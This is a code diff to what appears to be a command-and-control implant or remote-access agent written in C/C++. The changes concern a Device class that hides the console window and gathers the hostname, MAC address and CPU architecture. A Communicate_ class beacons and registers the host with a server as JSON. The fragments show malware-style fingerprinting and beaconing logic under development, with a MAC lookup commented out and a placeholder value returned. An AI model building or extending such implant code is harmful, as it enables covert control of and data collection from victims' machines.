@@ -1,11 +1,26 @@
-#include <winsock2.h>
-#include <windows.h>
-#include <stdbool.h>
-#include <cstdio>
-#include "cJSON/cJSON.h"
 #include <fcntl.h>
 #include <cstdlib>
 #include <unistd.h>
+#include <stdbool.h>
+#include <cstdio>
+
+#ifdef _WIN32
+    #include <winsock2.h>
+    #include <windows.h>
+    #include "cJSON/cJSON.h"
+    //#include <Iphlpapi.h>
+    //#include <Assert.h>
+    //#pragma comment(lib, "iphlpapi.lib")
+    //#pragma comment(lib, "ws2_32.lib")
+    //#pragma comment(lib, "Secur32.lib")
+#else
+    #include <cjson/cJSON.h>
+    
+#endif
+//#include <Iphlpapi.h>
+//#include <Assert.h>
+//#pragma comment(lib, "iphlpapi.lib")
+
 
 //#pragma comment(lib, "ws2_32.lib")
 //#pragma comment(lib, "Secur32.lib")
@@ -19,7 +34,6 @@
 class Device {
     public:
     void hideConsole();
-    const char* get_hostname();
     const char* get_MAC();
     const char* get_Arch();
 };
@@ -90,16 +104,62 @@ void Device::hideConsole() {
 }
 
 // change
-const char* Device::get_Arch() {
+const char* Device::get_MAC() {
     return "hello";
 }
-
-const char* Device::get_hostname() {
-    return "hackerpc";
-}
-
+/*
 const char* Device::get_MAC() {
-    return "xx-yy-xx";
+    PIP_ADAPTER_INFO AdapterInfo;
+    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
+    char *mac_addr = (char*)malloc(18);
+  
+    AdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));
+    if (AdapterInfo == NULL) {
+      printf("Error allocating memory needed to call GetAdaptersinfo\n");
+      free(mac_addr);
+      return NULL; // it is safe to call free(NULL)
+    }
+
+    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
+      free(AdapterInfo);
+      AdapterInfo = (IP_ADAPTER_INFO *) malloc(dwBufLen);
+      if (AdapterInfo == NULL) {
+        printf("Error allocating memory needed to call GetAdaptersinfo\n");
+        free(mac_addr);
+        return NULL;
+      }
+    }
+  
+    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
+      // Contains pointer to current adapter info
+      PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
+      do {
+        // technically should look at pAdapterInfo->AddressLength
+        //   and not assume it is 6.
+        sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
+          pAdapterInfo->Address[0], pAdapterInfo->Address[1],
+          pAdapterInfo->Address[2], pAdapterInfo->Address[3],
+          pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
+
+        printf("\n");
+        pAdapterInfo = pAdapterInfo->Next;        
+      } while(pAdapterInfo);                        
+    }
+    free(AdapterInfo);
+    return mac_addr;
+}
+*/
+
+
+const char* Device::get_Arch() {
+    SYSTEM_INFO sysInfo;
+    GetNativeSystemInfo(&sysInfo);
+    switch (sysInfo.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
+        case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
+        case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
+        default: return "unknown"; break;
+    }
 }
 
 
@@ -161,11 +221,19 @@ void Communicate_::beacon(const char *id) {
 }
 
 void Communicate_::reg(Device d) {
+    char hostname[BUFFER_SIZE];
+    char os[BUFFER_SIZE];
+
+    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
+
+    const char *mac = d.get_MAC();    
+    snprintf(os,sizeof(os), "%s", "windows");
+
     cJSON *reg = cJSON_CreateObject();
     cJSON_AddStringToObject(reg, "mode", "register");
-    cJSON_AddStringToObject(reg, "os", "windows");
-    cJSON_AddStringToObject(reg, "mac", d.get_MAC());
-    cJSON_AddStringToObject(reg, "hostname", d.get_hostname());
+    cJSON_AddStringToObject(reg, "os", os);
+    cJSON_AddStringToObject(reg, "mac", mac);
+    cJSON_AddStringToObject(reg, "hostname", hostname);
     cJSON_AddStringToObject(reg, "arch", d.get_Arch());
     // send to server
     char *data = cJSON_Print(reg);
